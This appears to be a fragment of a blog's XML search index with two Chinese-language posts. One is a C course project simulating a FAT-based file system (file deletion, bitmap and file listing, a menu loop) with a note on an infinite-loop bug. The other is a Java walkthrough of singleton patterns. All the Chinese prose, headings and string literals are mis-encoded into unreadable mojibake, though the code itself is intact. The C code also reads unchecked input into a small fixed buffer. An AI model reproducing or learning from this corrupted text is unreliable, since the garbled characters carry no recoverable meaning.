class="string">"æ‚¨è¾“å…¥æœ‰è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ï¼\n"</span>);</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showBitmap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"â€œ0â€ä»£è¡¨ç©ºé—²ï¼Œâ€œ1â€ä»£è¡¨å·²ç”¨\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i * <span class="number">16</span> + j &gt;= BLOCKNUM) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d "</span>, d.bitmap[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">15</span>) <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showFiles</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"----------------------------------------------------------------------"</span></span><br><span class="line">        <span class="string">"--------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%-20s|%-19s|%-19s|%-10s|%-10s|\n"</span>, <span class="string">"æ–‡ä»¶å"</span>, <span class="string">"åˆ›å»ºæ—¥æœŸ"</span>,</span><br><span class="line">           <span class="string">"ä¿®æ”¹æ—¥æœŸ"</span>, <span class="string">"æƒé™ä¿¡æ¯"</span>, <span class="string">"æ–‡ä»¶å¤§å°"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (d.directory[i].nodeId != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                <span class="string">"|%-20s|%4d-%2d-%2d %2d:%2d:%2d|%4d-%2d-%2d "</span></span><br><span class="line">                <span class="string">"%2d:%2d:%2d|%-10d|%-10d|\n"</span>,</span><br><span class="line">                d.directory[i].fileName,</span><br><span class="line">                <span class="comment">// å¹´ä»½ä»1900å¼€å§‹ç®—èµ·ï¼Œå› æ­¤è¦åŠ ä¸Š1900</span></span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_year +</span><br><span class="line">                    <span class="number">1900</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_mon + <span class="number">1</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_mday,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_hour + <span class="number">8</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_min,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_sec,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_year +</span><br><span class="line">                    <span class="number">1900</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_mon +</span><br><span class="line">                    <span class="number">1</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_mday,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_hour +</span><br><span class="line">                    <span class="number">8</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_min,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_sec,</span><br><span class="line">                d.FDI[d.directory[i].nodeId].permission,</span><br><span class="line">                d.FDI[d.directory[i].nodeId].usedBlocksNum);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"----------------------------------------------------------------------"</span></span><br><span class="line">        <span class="string">"--------------\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é”™è¯¯ç ï¼š</span></span><br><span class="line"><span class="comment"> * 2ï¼šæ–‡ä»¶ä¸å­˜åœ¨</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Delete</span><span class="params">(<span class="keyword">char</span> *fileName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(d.directory[i].fileName, fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= dirLastIndex) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> nextIndex = d.FDI[d.directory[i].nodeId].firstBlockId;</span><br><span class="line">    <span class="keyword">int</span> row, col, pre;</span><br><span class="line">    <span class="keyword">while</span> (d.FAT[nextIndex] != EOF) &#123;</span><br><span class="line">        row = nextIndex / COL;</span><br><span class="line">        col = nextIndex % COL;</span><br><span class="line">        d.bitmap[row][col] = FREE;</span><br><span class="line">        pre = nextIndex;</span><br><span class="line">        nextIndex = d.FAT[nextIndex];</span><br><span class="line">        d.FAT[pre] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    row = nextIndex / COL;</span><br><span class="line">    col = nextIndex % COL;</span><br><span class="line">    d.bitmap[row][col] = FREE;</span><br><span class="line">    d.FDI[d.directory[i].nodeId].isDelete = <span class="number">1</span>;</span><br><span class="line">    d.directory[i].nodeId = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryDelete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">11</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ‚¨æƒ³è¦åˆ é™¤çš„æ–‡ä»¶ï¼š\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">    <span class="keyword">int</span> status = Delete(fileName);</span><br><span class="line">    <span class="keyword">if</span> (status == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥!\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"åˆ é™¤æˆåŠŸï¼\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showFAT</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, len = <span class="number">25</span>, j = <span class="number">1</span>, t, k;</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= <span class="number">4</span>; j++) &#123;</span><br><span class="line">        t = i;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= <span class="number">114</span>; k++) <span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"|%-12s|"</span>, <span class="string">"ç¼–å·"</span>);</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; j * len; i++) <span class="built_in">printf</span>(<span class="string">"%-3d|"</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"|%-12s|"</span>, <span class="string">"ä¸‹ä¸€å—ç›˜å—å·"</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = t; i &lt; j * len; i++) <span class="built_in">printf</span>(<span class="string">"%-3d|"</span>, d.FAT[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= <span class="number">114</span>; k++) <span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–ç£ç›˜ å³æ ¼å¼åŒ–</span></span><br><span class="line">    intial();</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exit</span> = <span class="number">0</span>, choice;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">exit</span>) &#123;</span><br><span class="line">        system(<span class="string">"cls"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1.åˆ›å»ºæ–‡ä»¶\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.è¯»å–æ–‡ä»¶\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3.å†™å…¥æ–‡ä»¶\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"4.åˆ é™¤æ–‡ä»¶\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"5.æ˜¾ç¤ºç¤ºä½å›¾\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"6.åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"7.æ‰“å°FAT\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0.é€€å‡ºç³»ç»Ÿ\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                tryCreate();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                tryRead();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                tryWrite();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                tryDelete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                showBitmap();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                showFiles();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                showFAT();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">exit</span> = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"è¾“å…¥æœ‰è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ï¼\n"</span>);</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å°æ’æ›²"><a href="#å°æ’æ›²" class="headerlink" title="å°æ’æ›²"></a>å°æ’æ›²</h2><p>åœ¨éªŒæ”¶å‰çš„åå‡ åˆ†é’Ÿçªç„¶å‘ç°<code>getFreeBlock()</code>å‡½æ•°æœ‰<code>bug</code>ï¼Œå½“æ—¶ç«‹é©¬ä»è…¾è®¯ä¼šè®®ä¸­é€€å‡ºæ¥ï¼Œæµ‹è¯•äº†å¥½ä¹…å‘ç°æ˜¯<code>for</code>å¾ªç¯æœ‰é—®é¢˜ï¼Œä¹‹å‰çš„å†™æ³•æ˜¯è¿™æ ·ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (; i &lt; <span class="number">7</span>; i =( i + <span class="number">1</span> ) % <span class="number">7</span>)</span><br><span class="line">	<span class="keyword">for</span> (; j &lt; <span class="number">16</span>; j = (j + <span class="number">1</span>) % <span class="number">16</span>) &#123;</span><br><span class="line">                </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å­å†…å¾ªç¯ä¸€ç›´ç»“æŸä¸äº†ï¼Œé€ æˆäº†æ­»å¾ªç¯ã€‚ä¹‹å‰ä¸€ç›´æ²¡å‘ç°è¿™ä¸ªé—®é¢˜æ˜¯å› ä¸ºä¹‹å‰æµ‹è¯•çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¸ä¼šæŠŠæ–‡ä»¶å¤§å°æ”¹å¾—å¾ˆå¤§ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘è¿™ä¸ªå¾ªç¯ã€‚</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>è¯¾ç¨‹è®¾è®¡</tag>
        <tag>æ“ä½œç³»ç»Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…è°ˆè®¾è®¡æ¨¡å¼ä¹‹å•ä¾‹æ¨¡å¼</title>
    <url>/2020/05/07/%E6%B5%85%E8%B0%88%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>å•ä¾‹æ¨¡å¼ï¼š ä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ï¼Œ ç›®çš„æ˜¯ä¸ºäº†ä¿è¯åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ï¼ŒæŸä¸ªç±»æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå®ä¾‹ã€‚ </p>
<p>è¦åšåˆ°è¿™ç‚¹ï¼Œå¿…é¡»å°†æ„é€ æ–¹æ³•è¿›è¡Œç§æœ‰ï¼Œé˜²æ­¢å¤–éƒ¨é€šè¿‡æ„é€ æ–¹æ³•è¿›è¡Œå®ä¾‹åŒ–è¯¥ç±»ï¼Œåœ¨ç±»å†…éƒ¨æä¾›æ–¹æ³•å¼•ç”¨å”¯ä¸€åˆ›å»ºçš„å®ä¾‹ã€‚<a id="more"></a></p>
<h2 id="å®ç°æ–¹å¼"><a href="#å®ç°æ–¹å¼" class="headerlink" title="å®ç°æ–¹å¼"></a>å®ç°æ–¹å¼</h2><h3 id="æ‡’æ±‰æ¨¡å¼"><a href="#æ‡’æ±‰æ¨¡å¼" class="headerlink" title="æ‡’æ±‰æ¨¡å¼"></a>æ‡’æ±‰æ¨¡å¼</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å¤–éƒ¨ç±»å°±ä¸èƒ½é€šè¿‡æ„é€ æ–¹æ³•è¿›è¡Œå®ä¾‹åŒ–è¯¥ç±»ï¼Œåªèƒ½é€šè¿‡<code>Singleton.getInstance()</code>çš„æ–¹å¼è¿›è¡Œè·å–å”¯ä¸€çš„å¯¹è±¡ã€‚ä½†æ˜¯å¾ˆé—æ†¾ï¼Œè¯¥æ–¹å¼æ²¡æœ‰è€ƒè™‘å¤šçº¿ç¨‹çš„æƒ…å†µï¼Œä¸åŒçš„çº¿ç¨‹åŒæ—¶è°ƒç”¨<code>Singleton.getInstance()</code>çš„æ—¶å€™å¾ˆæœ‰å¯èƒ½ä¼šå®ä¾‹åŒ–å¤šä¸ªå¯¹è±¡ã€‚å› æ­¤éœ€è¦å¯¹<code>getInstance()</code>è¿›è¡ŒåŠ é”</p>
<h3 id="åŠ å¼ºç‰ˆæ‡’æ±‰æ¨¡å¼ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰"><a href="#åŠ å¼ºç‰ˆæ‡’æ±‰æ¨¡å¼ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰" class="headerlink" title="åŠ å¼ºç‰ˆæ‡’æ±‰æ¨¡å¼ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰"></a>åŠ å¼ºç‰ˆæ‡’æ±‰æ¨¡å¼ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰</h3><p>ç»™åŠ ä¸Š<code>getInstance()</code>ï¼ŒåŠ ä¸Š<code>synchronized</code>å…³é”®å­—</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å¤šçº¿ç¨‹å¹¶å‘æ‰§è¡Œ<code>getInstance()</code>çš„æ—¶å€™ï¼Œå°±åªæœ‰æœ€æ—©æ‹¿åˆ°é”çš„çº¿ç¨‹èƒ½å¤Ÿæ‰§è¡Œ<code>instance = new Singleton()</code>ï¼Œå…¶ä»–çš„çº¿ç¨‹ä»é˜»å¡é˜Ÿåˆ—ä¸­ä¸‹æ¥çš„æ—¶å€™<code>Singleton</code>å·²ç»è¢«å®ä¾‹åŒ–äº†ï¼Œå› æ­¤ä¸ä¼šæ‰§è¡Œ<code>instance = new Singleton()</code>ï¼Œä»è€Œç¡®ä¿å¤šçº¿ç¨‹å®‰å…¨ã€‚ é—æ†¾çš„æ˜¯ï¼Œç”±äºsynchronizedçš„å­˜åœ¨ï¼Œæ•ˆç‡å¾ˆä½ï¼Œåœ¨å•çº¿ç¨‹çš„æƒ…æ™¯ä¸‹ï¼Œå®Œå…¨å¯ä»¥å»æ‰synchronizedï¼Œä¸ºäº†å…¼é¡¾æ•ˆç‡ä¸æ€§èƒ½é—®é¢˜ï¼Œæ”¹è¿›åä»£ç å¦‚ä¸‹ï¼š </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•ä¹Ÿå«<strong>â€œåŒé‡æ ¡éªŒæ³•â€</strong>ï¼Œåœ¨<code>instance != null</code>çš„æ—¶å€™ï¼Œå°±ä¸ä¼šè¿›è¡ŒåŠ é”æ“ä½œï¼Œæå‡äº†ç³»ç»Ÿæ€§èƒ½ã€‚ä½†æ˜¯ç†è®ºæ˜¯ç¾å¥½çš„ï¼Œè€Œç°å®æ˜¯æ®‹é…·çš„ï¼Œ ç”±äºJavaçš„å†…å­˜æ¨¡å‹ ï¼Œä¸Šè¿°ä»£ç åœ¨æ‰§è¡ŒæœŸé—´è¿˜æ˜¯æœ‰äº›ä¸åŒï¼Œå…·ä½“å‚ç…§<a href="https://blog.csdn.net/chenchaofuck1/article/details/51702129" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a></p>
<h3 id="é¥¿æ±‰æ¨¡å¼"><a href="#é¥¿æ±‰æ¨¡å¼" class="headerlink" title="é¥¿æ±‰æ¨¡å¼"></a>é¥¿æ±‰æ¨¡å¼</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥æ¨¡å¼åœ¨åŠ è½½è¯¥ç±»çš„æ—¶å€™ç›´æ¥å®ä¾‹åŒ–è¯¥ç±»ï¼Œå› æ­¤ä¸ç®¡ç”¨ä¸ä¸ç”¨éƒ½å ç€ç©ºé—´ï¼Œå¦‚æœé¡¹ç›®ä¸­æœ‰å¤§é‡å•ä¾‹å¯¹è±¡ï¼Œåˆ™å¯èƒ½ä¼šæµªè´¹å¤§é‡å†…å­˜ç©ºé—´ </p>
<h3 id="é™æ€å†…éƒ¨ç±»åŠ è½½"><a href="#é™æ€å†…éƒ¨ç±»åŠ è½½" class="headerlink" title="é™æ€å†…éƒ¨ç±»åŠ è½½"></a>é™æ€å†…éƒ¨ç±»åŠ è½½</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥æ¨¡å¼åœ¨åŠ è½½<code>Singleton</code>ç±»çš„æ—¶å€™ä¸ä¼šç›´æ¥å®ä¾‹åŒ–è¯¥ç±»ï¼Œè€Œæ˜¯è°ƒç”¨<code>getInstance()</code>åæ‰å®ä¾‹åŒ–<code>Singleton</code>ç±»ï¼Œåšåˆ°äº†æ‡’åŠ è½½çš„æ•ˆæœï¼Œè€Œä¸”æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</p>
<h3 id="å€ŸåŠ©æšä¸¾ç±»"><a href="#å€ŸåŠ©æšä¸¾ç±»" class="headerlink" title="å€ŸåŠ©æšä¸¾ç±»"></a>å€ŸåŠ©æšä¸¾ç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Singleton &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ˜¯ä¸æ˜¯ååˆ†çš„ç®€æ´ï¼Ÿè¿™ç§æ–¹å¼è§£å†³äº†ä»¥ä¸‹ä¸‰ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>è‡ªç”±åºåˆ—åŒ–ã€‚å…³äºåºåˆ—åŒ–ï¼Œ<a href="https://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener">è¿™é‡Œ</a>æœ‰æ¯”è¾ƒè¯¦ç»†çš„ä»‹ç»</li>
<li>ä¿è¯åªæœ‰ä¸€ä¸ªå®ä¾‹ã€‚</li>
<li>çº¿ç¨‹å®‰å…¨ã€‚</li>
</ul>
<p>å¼•ç”¨å®ä¾‹å¯¹è±¡çš„æ—¶å€™åªéœ€è¦ï¼š<code>Singleton singleton = Singleton.INSTANCE</code>å³å¯ï¼Œå½“ç„¶äº†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åƒå¸¸è§„ç±»ä¸€æ ·æ·»åŠ å˜é‡å’Œæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Singleton &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">"INSTANCE"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨çš„æ—¶å€™åªéœ€<code>Singleton.INSTANCE.getName()</code>ã€‚</p>
<p>ä½†æ˜¯åœ¨<code>Android</code>å¹³å°ä¸Šé¢ï¼Œ<code>Android</code>å®˜æ–¹ä¸å»ºè®®ä½¿ç”¨æšä¸¾ç±»å®ç°å•ä¾‹ï¼Œ å› ä¸ºå†…å­˜æ¶ˆè€—ä¼šå…¶ä»–æ–¹å¼å¤šä¸€äº› ã€‚</p>
